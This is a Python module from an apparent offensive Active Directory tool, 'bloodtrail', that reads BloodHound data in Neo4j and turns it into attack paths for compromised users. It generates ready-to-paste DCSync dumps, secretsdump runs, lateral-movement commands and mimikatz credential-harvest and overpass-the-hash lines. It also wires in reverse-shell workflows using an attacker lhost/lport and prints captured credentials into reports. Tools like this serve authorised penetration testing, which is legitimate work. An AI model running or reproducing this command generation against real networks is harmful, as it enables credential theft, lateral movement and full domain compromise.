"""
Attack path display for bloodtrail.

Generates attack paths from Neo4j BloodHound data for pwned users.
"""

from typing import List

from .base import Colors, NoColors, truncate
from .techniques import generate_technique_legend_console, generate_technique_legend_markdown
from .authenticated import generate_authenticated_attacks_template_markdown
from .post_exploit import _generate_ptt_workflow, _generate_dcom_workflow
from .manual_enum import generate_manual_enumeration_suggestions


def generate_pwned_attack_paths(driver, use_colors: bool = True) -> tuple:
    """
    Generate Pwned User Attack Paths section for the report.

    Queries Neo4j for pwned users and their access paths, generates
    credential-type-aware commands based on each user's specific privileges.
    Shows ALL available techniques per target for easy copy-paste.

    Args:
        driver: Neo4j driver instance
        use_colors: Enable ANSI colors for console output

    Returns:
        Tuple of (console_output: str, markdown_output: str)
        Returns ("", "") if no pwned users
    """
    from ..mappings.edge_mappings import CRED_TYPE_TEMPLATES
    from ..mappings.lateral import LATERAL_TECHNIQUES, get_techniques_for_access
    from ..mappings.command_fill import fill_pwned_command
    from ..mappings.text_utils import infer_dc_hostname
    from ..mappings.authenticated import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS

    c = Colors if use_colors else NoColors

    # Fetch all pwned users with credentials
    pwned_users = _fetch_pwned_users(driver)
    if not pwned_users:
        return "", ""

    console_lines = []
    markdown_lines = []

    # Header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}╔══════════════════════════════════════════════════════════════════════╗{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}║{c.RESET}   {c.YELLOW}🎯{c.RESET} {c.BOLD}Pwned User Attack Paths{c.RESET}                                      {c.CYAN}{c.BOLD}║{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}╚══════════════════════════════════════════════════════════════════════╝{c.RESET}")
    console_lines.append("")

    markdown_lines.append("## 🎯 Pwned User Attack Paths")
    markdown_lines.append("")

    for user in pwned_users:
        user_name = user["name"]
        cred_type = user.get("cred_type", "password")
        cred_value = user.get("cred_value", "")

        # Extract username and domain from UPN
        if "@" in user_name:
            username, domain = user_name.split("@")
        else:
            username = user_name
            domain = ""

        # Fetch access paths for this user
        access_by_priv = _fetch_user_access(driver, user_name)

        # Check domain-level access
        domain_access = _check_domain_access(driver, user_name)

        # User header
        console_lines.append(f"{c.BOLD}{c.CYAN}{'═'*70}{c.RESET}")
        console_lines.append(f"{c.BOLD}{user_name}{c.RESET}")
        console_lines.append(f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET}")
        console_lines.append(f"{c.CYAN}{'─'*70}{c.RESET}")

        markdown_lines.append(f"### {user_name}")
        markdown_lines.append(f"**Credential:** {cred_type}")
        markdown_lines.append("")

        # Domain-level access (DCSync / DomainAdmin)
        if domain_access in ("DCSync", "DomainAdmin", "GenericAll"):
            console_lines.append("")
            access_label = "DOMAIN ADMIN" if domain_access == "DomainAdmin" else domain_access
            console_lines.append(f"👑 {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [{access_label}]")
            console_lines.append("")
            console_lines.append(f"  {'Attack':<22} {'Reason':<40} {'Ready Command'}")
            console_lines.append(f"  {'-'*22} {'-'*40} {'-'*60}")

            template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("DCSync")
            if template and cred_value:
                cmd = fill_pwned_command(template, username, domain, infer_dc_hostname(domain), cred_value)
                reason = "Member of Domain Admins" if domain_access == "DomainAdmin" else "GetChanges+GetChangesAll"
                console_lines.append(
                    f"  {c.BOLD}{'DCSync':<22}{c.RESET} "
                    f"{c.YELLOW}{truncate(reason, 38):<40}{c.RESET} "
                    f"{c.GREEN}{cmd}{c.RESET}"
                )

            markdown_lines.append(f"#### DCSync - Dump Domain Credentials ⚡")
            markdown_lines.append(f"| Attack | Reason | Command |")
            markdown_lines.append(f"|--------|--------|---------|")
            if template and cred_value:
                cmd = fill_pwned_command(template, username, domain, infer_dc_hostname(domain), cred_value)
                reason = "Member of Domain Admins" if domain_access == "DomainAdmin" else "GetChanges+GetChangesAll"
                markdown_lines.append(f"| DCSync | {reason} | `{cmd}` |")
            markdown_lines.append("")

        # Local Admin access
        admin_machines = access_by_priv.get("local-admin", [])
        if admin_machines:
            console_lines.append("")
            console_lines.append(f"🩸 {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(admin_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### Local Admin Access ({len(admin_machines)} machines)")
            markdown_lines.append("")

            priority_targets = []
            techniques = get_techniques_for_access("AdminTo")

            for ma in admin_machines[:10]:
                has_sessions = bool(ma.get("privileged_sessions"))
                inherited_from = ma.get("inherited_from")
                access_note = f" (via {inherited_from})" if inherited_from else ""

                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}{c.DIM}{access_note}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**{access_note}")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for tech in techniques:
                    template = tech.command_templates.get(cred_type)
                    if template and cred_value:
                        cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        tech_short = tech.name.split()[0].lower()
                        console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                        markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

                if has_sessions:
                    priority_targets.append((ma, ma.get("privileged_sessions", [])))

            if len(admin_machines) > 10:
                console_lines.append(f"  {c.DIM}... and {len(admin_machines) - 10} more machines{c.RESET}")

            # Priority targets with sessions
            if priority_targets:
                console_lines.append("")
                console_lines.append(f"  {c.YELLOW}⚠ PRIORITY TARGETS (privileged sessions detected){c.RESET}")
                console_lines.append("")

                markdown_lines.append(f"**Priority Targets (Active Sessions)**")
                markdown_lines.append("")

                for ma, sessions in priority_targets[:5]:
                    sessions_str = ", ".join(sessions[:2])
                    console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")
                    console_lines.append(f"    {c.YELLOW}Sessions: {sessions_str}{c.RESET}")

                    markdown_lines.append(f"**{ma['computer']}** - Sessions: {sessions_str}")
                    markdown_lines.append("")

                    sd_template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("secretsdump")
                    if sd_template and cred_value:
                        sd_cmd = fill_pwned_command(sd_template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        console_lines.append(f"    {c.DIM}secretsdump:{c.RESET}  {c.GREEN}{sd_cmd}{c.RESET}")
                        markdown_lines.append(f"```bash\n{sd_cmd}\n```")
                    console_lines.append("")
                    markdown_lines.append("")

            # Technique legend
            console_lines.append(generate_technique_legend_console(techniques, c))
            markdown_lines.append(generate_technique_legend_markdown(techniques))

        # User-level access
        user_machines = access_by_priv.get("user-level", [])
        if user_machines:
            console_lines.append("")
            console_lines.append(f"🔵 {c.BLUE}{c.BOLD}USER-LEVEL ACCESS{c.RESET} ({len(user_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### User-Level Access ({len(user_machines)} machines)")
            markdown_lines.append("")

            for ma in user_machines[:5]:
                access_types = ma.get("access_types", [])
                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for access_type in access_types:
                    if access_type in ("CanRDP", "CanPSRemote"):
                        techniques = get_techniques_for_access(access_type)
                        for tech in techniques:
                            template = tech.command_templates.get(cred_type)
                            if template and cred_value:
                                cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                                tech_short = tech.name.split()[0].lower()
                                console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                                markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

        # DCOM access
        dcom_machines = access_by_priv.get("dcom-exec", [])
        if dcom_machines:
            console_lines.append("")
            console_lines.append(f"⚙️  {c.BLUE}{c.BOLD}DCOM ACCESS{c.RESET} ({len(dcom_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### DCOM Access ({len(dcom_machines)} machines)")
            markdown_lines.append("")

            techniques = get_techniques_for_access("ExecuteDCOM")

            for ma in dcom_machines[:3]:
                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for tech in techniques:
                    template = tech.command_templates.get(cred_type)
                    if template and cred_value:
                        cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        tech_short = tech.name.split()[0].lower()
                        console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                        markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

        # No edge-based access - show manual enumeration suggestions
        if not admin_machines and not user_machines and not dcom_machines and not domain_access:
            # Only show manual enum if we have credentials
            if cred_value:
                # Fetch SPNs and DC IP for this user
                user_spns = _fetch_user_spns(driver, user_name)
                dc_ip = _fetch_dc_ip(driver)

                manual_console, manual_markdown = generate_manual_enumeration_suggestions(
                    username=username,
                    domain=domain,
                    cred_type=cred_type,
                    cred_value=cred_value,
                    spns=user_spns,
                    dc_ip=dc_ip,
                    use_colors=use_colors,
                )
                console_lines.extend(manual_console)
                markdown_lines.extend(manual_markdown)
            else:
                console_lines.append(f"{c.DIM}No direct machine access via AdminTo/CanRDP/CanPSRemote edges.{c.RESET}")
                markdown_lines.append("_No direct machine access via BloodHound edges_")
                markdown_lines.append("")

        console_lines.append("")

    # Authenticated user attacks at the end
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    console_lines.append(f"{c.DIM}Replace placeholders with your credentials:{c.RESET}")
    console_lines.append("")

    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    console_lines.append(f"  {'Attack':<25} {'Command Template'}")
    console_lines.append(f"  {'-'*25} {'-'*80}")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            priority = " ⚡" if attack.get("priority") == "high" else ""
            name_display = f"{attack['name']}{priority}"
            console_lines.append(f"  {c.BOLD}{name_display:<25}{c.RESET} {c.GREEN}{template}{c.RESET}")

    console_lines.append("")

    markdown_lines.append(generate_authenticated_attacks_template_markdown())

    return "\n".join(console_lines), "\n".join(markdown_lines)


def generate_post_exploit_section(driver, use_colors: bool = True, lhost: str = None, lport: int = None) -> tuple:
    """
    Generate Post-Exploitation Commands section for the report.

    Shows mimikatz credential harvest commands for all pwned users
    with local admin access.

    Args:
        driver: Neo4j driver instance
        use_colors: Enable ANSI colors for console output
        lhost: Attacker IP for reverse shells
        lport: Attacker port for reverse shells

    Returns:
        Tuple of (console_output: str, markdown_output: str)
    """
    from ..mappings.post_exploit import get_post_exploit_commands, get_harvest_tips

    c = Colors if use_colors else NoColors

    # Fetch lhost/lport from domain config if not provided
    if lhost is None or lport is None:
        try:
            with driver.session() as session:
                result = session.run("""
                    MATCH (d:Domain)
                    RETURN d.bloodtrail_lhost AS lhost, d.bloodtrail_lport AS lport
                    LIMIT 1
                """)
                record = result.single()
                if record:
                    lhost = lhost or record.get("lhost")
                    lport = lport or record.get("lport")
        except Exception:
            pass

    # Fetch all pwned users with credentials
    pwned_users = _fetch_pwned_users(driver)
    if not pwned_users:
        return "", ""

    # Filter to users with local admin access
    users_with_admin = []
    for user in pwned_users:
        user_name = user["name"]
        access_by_priv = _fetch_user_access(driver, user_name)
        admin_machines = access_by_priv.get("local-admin", [])
        domain_access = _check_domain_access(driver, user_name)

        if admin_machines or domain_access:
            users_with_admin.append({
                "name": user_name,
                "cred_type": user.get("cred_type", "password"),
                "cred_value": user.get("cred_value", ""),
                "admin_machines": admin_machines,
                "domain_access": domain_access,
            })

    if not users_with_admin:
        return "", ""

    console_lines = []
    markdown_lines = []

    # Header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}╔══════════════════════════════════════════════════════════════════════╗{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}║{c.RESET}   {c.RED}🔓{c.RESET} {c.BOLD}Post-Exploitation Commands{c.RESET}                                    {c.CYAN}{c.BOLD}║{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}╚══════════════════════════════════════════════════════════════════════╝{c.RESET}")
    console_lines.append("")

    markdown_lines.append("## 🔓 Post-Exploitation Commands")
    markdown_lines.append("")

    for user_data in users_with_admin:
        user_name = user_data["name"]
        cred_type = user_data["cred_type"]
        cred_value = user_data["cred_value"]
        admin_machines = user_data["admin_machines"]
        domain_access = user_data["domain_access"]

        if "@" in user_name:
            username, domain = user_name.split("@")
        else:
            username = user_name
            domain = ""

        # User header
        console_lines.append(f"{c.BOLD}{c.CYAN}{'═'*70}{c.RESET}")
        console_lines.append(f"{c.BOLD}{user_name}{c.RESET}")
        console_lines.append(f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET}" + (f" = {c.GREEN}{cred_value}{c.RESET}" if cred_value else ""))
        console_lines.append(f"{c.CYAN}{'─'*70}{c.RESET}")
        console_lines.append("")

        markdown_lines.append(f"### {user_name}")
        markdown_lines.append(f"**Credential:** {cred_type}" + (f" = `{cred_value}`" if cred_value else ""))
        markdown_lines.append("")

        # Targets
        if admin_machines:
            target_list = ", ".join([m.get("computer", "?").split(".")[0] for m in admin_machines[:5]])
            if len(admin_machines) > 5:
                target_list += f" (+{len(admin_machines)-5} more)"
            console_lines.append(f"  {c.BOLD}Targets ({len(admin_machines)}):{c.RESET} {target_list}")
            console_lines.append("")

            markdown_lines.append(f"**Targets ({len(admin_machines)}):** {target_list}")
            markdown_lines.append("")

        # Credential Harvest Order
        console_lines.append(f"  {c.CYAN}{c.BOLD}CREDENTIAL HARVEST ORDER:{c.RESET}")
        console_lines.append("")

        markdown_lines.append("#### Credential Harvest Order")
        markdown_lines.append("")
        markdown_lines.append("| # | Command | Priority |")
        markdown_lines.append("|---|---------|----------|")

        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")
        for idx, cmd_tuple in enumerate(harvest_commands, 1):
            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"
            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'

            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
            console_lines.append(f"    {idx}. {c.GREEN}{mimi_cmd}{c.RESET}  {priority_color}[{priority.upper()}]{c.RESET}")

            markdown_lines.append(f"| {idx} | `{mimi_cmd}` | {priority.upper()} |")

        console_lines.append("")
        markdown_lines.append("")

        # Overpass-the-Hash tip
        console_lines.append(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
        console_lines.append(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
        console_lines.append(f"    {c.YELLOW}⚠ Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
        console_lines.append("")

        markdown_lines.append("#### With Harvested NTLM Hash")
        markdown_lines.append("")
        markdown_lines.append(f'```')
        markdown_lines.append(f'mimikatz.exe "sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe"')
        markdown_lines.append(f'```')
        markdown_lines.append(f'> ⚠️ Use HOSTNAME not IP after Overpass-the-Hash!')
        markdown_lines.append("")

        # PTT and DCOM workflows
        target_hostnames = [m.get("computer", "TARGET") for m in admin_machines[:3]]
        ptt_console, ptt_markdown = _generate_ptt_workflow(target_hostnames, domain, c)
        console_lines.extend(ptt_console)
        markdown_lines.extend(ptt_markdown)

        target_ips = [m.get("ip") or "<TARGET_HOST_IP>" for m in admin_machines[:3]]
        dcom_console, dcom_markdown = _generate_dcom_workflow(target_ips, c, lhost=lhost, lport=lport)
        console_lines.extend(dcom_console)
        markdown_lines.extend(dcom_markdown)

    return "\n".join(console_lines), "\n".join(markdown_lines)


def _fetch_user_spns(driver, user_name: str) -> list:
    """Fetch a user's Service Principal Names from Neo4j."""
    try:
        with driver.session() as session:
            result = session.run("""
                MATCH (u:User {name: $user_name})
                RETURN u.serviceprincipalnames AS SPNs
            """, {"user_name": user_name})
            record = result.single()
            if record and record["SPNs"]:
                return list(record["SPNs"])
            return []
    except Exception:
        return []


def _fetch_dc_ip(driver) -> str:
    """Fetch DC IP from domain configuration in Neo4j."""
    try:
        with driver.session() as session:
            result = session.run("""
                MATCH (d:Domain)
                RETURN d.bloodtrail_dc_ip AS dc_ip
                LIMIT 1
            """)
            record = result.single()
            if record and record["dc_ip"]:
                return record["dc_ip"]
            return None
    except Exception:
        return None


def _fetch_pwned_users(driver) -> list:
    """Fetch all pwned users with their credentials from Neo4j."""
    try:
        with driver.session() as session:
            result = session.run("""
                MATCH (u:User)
                WHERE u.pwned = true
                RETURN u.name AS name,
                       u.pwned_cred_types AS cred_types,
                       u.pwned_cred_values AS cred_values,
                       u.pwned_source_machine AS source_machine
                ORDER BY u.pwned_at DESC
            """)
            users = []
            for record in result:
                cred_types = record["cred_types"] or []
                cred_values = record["cred_values"] or []
                users.append({
                    "name": record["name"],
                    "cred_type": cred_types[0] if cred_types else "password",
                    "cred_value": cred_values[0] if cred_values else "",
                    "source_machine": record["source_machine"]
                })
            return users
    except Exception:
        return []


def _fetch_user_access(driver, user_name: str) -> dict:
    """
    Fetch user's access paths grouped by privilege level.

    Returns:
        Dict with keys: 'local-admin', 'user-level', 'dcom-exec'
    """
    try:
        with driver.session() as session:
            result = session.run("""
                // Direct access
                MATCH (u:User {name: $user_name})-[r:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM]->(c:Computer)
                OPTIONAL MATCH (c)<-[:HasSession]-(priv:User)
                WHERE priv.admincount = true AND priv.name <> u.name
                WITH c, type(r) AS access_type, null AS inherited_from, collect(DISTINCT priv.name) AS priv_sessions
                RETURN c.name AS computer,
                       c.bloodtrail_ip AS computer_ip,
                       collect(DISTINCT access_type) AS access_types,
                       inherited_from,
                       priv_sessions AS privileged_sessions

                UNION

                // Inherited access
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[r:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM]->(c:Computer)
                OPTIONAL MATCH (c)<-[:HasSession]-(priv:User)
                WHERE priv.admincount = true AND priv.name <> u.name
                WITH c, type(r) AS access_type, g.name AS inherited_from, collect(DISTINCT priv.name) AS priv_sessions
                RETURN c.name AS computer,
                       c.bloodtrail_ip AS computer_ip,
                       collect(DISTINCT access_type) AS access_types,
                       inherited_from,
                       priv_sessions AS privileged_sessions
            """, {"user_name": user_name})

            access_by_priv = {
                "local-admin": [],
                "user-level": [],
                "dcom-exec": [],
            }
            seen_computers = {}

            for record in result:
                computer = record["computer"]
                computer_ip = record.get("computer_ip") or ""
                access_types = record["access_types"]
                inherited_from = record["inherited_from"]

                if computer in seen_computers:
                    existing = seen_computers[computer]
                    existing["access_types"] = list(set(existing["access_types"]) | set(access_types))
                    if inherited_from and not existing.get("inherited_from"):
                        existing["inherited_from"] = inherited_from
                    if computer_ip and not existing.get("computer_ip"):
                        existing["computer_ip"] = computer_ip
                    continue

                entry = {
                    "computer": computer,
                    "computer_ip": computer_ip,
                    "access_types": access_types,
                    "privileged_sessions": [s for s in record["privileged_sessions"] if s],
                    "inherited_from": inherited_from,
                }
                seen_computers[computer] = entry

                if "AdminTo" in access_types:
                    access_by_priv["local-admin"].append(entry)
                elif "ExecuteDCOM" in access_types:
                    access_by_priv["dcom-exec"].append(entry)
                elif access_types:
                    access_by_priv["user-level"].append(entry)

            return access_by_priv

    except Exception:
        return {"local-admin": [], "user-level": [], "dcom-exec": []}


def _check_domain_access(driver, user_name: str) -> str:
    """
    Check if user has domain-level privileges.

    Returns:
        'DCSync', 'DomainAdmin', 'GenericAll', or None
    """
    try:
        with driver.session() as session:
            # Check direct DCSync
            result = session.run("""
                MATCH (u:User {name: $user_name})-[r:GetChanges|GetChangesAll]->(d:Domain)
                WITH u, d, collect(DISTINCT type(r)) AS rights
                WHERE 'GetChanges' IN rights AND 'GetChangesAll' IN rights
                RETURN 'DCSync' AS access
            """, {"user_name": user_name})

            if result.single():
                return "DCSync"

            # Check inherited DCSync
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[r:GetChanges|GetChangesAll]->(d:Domain)
                WITH g, d, collect(DISTINCT type(r)) AS rights
                WHERE 'GetChanges' IN rights AND 'GetChangesAll' IN rights
                RETURN 'DCSync' AS access
            """, {"user_name": user_name})

            if result.single():
                return "DCSync"

            # Check Domain Admins membership
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)
                WHERE g.name STARTS WITH 'DOMAIN ADMINS@'
                   OR g.name STARTS WITH 'ENTERPRISE ADMINS@'
                   OR g.objectid ENDS WITH '-512'
                   OR g.objectid ENDS WITH '-519'
                RETURN g.name AS admin_group
                LIMIT 1
            """, {"user_name": user_name})

            if result.single():
                return "DomainAdmin"

            # Check direct GenericAll
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:GenericAll]->(d:Domain)
                RETURN 'GenericAll' AS access
            """, {"user_name": user_name})

            if result.single():
                return "GenericAll"

            # Check inherited GenericAll
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[:GenericAll]->(d:Domain)
                RETURN 'GenericAll' AS access
            """, {"user_name": user_name})

            if result.single():
                return "GenericAll"

            return None

    except Exception:
        return None
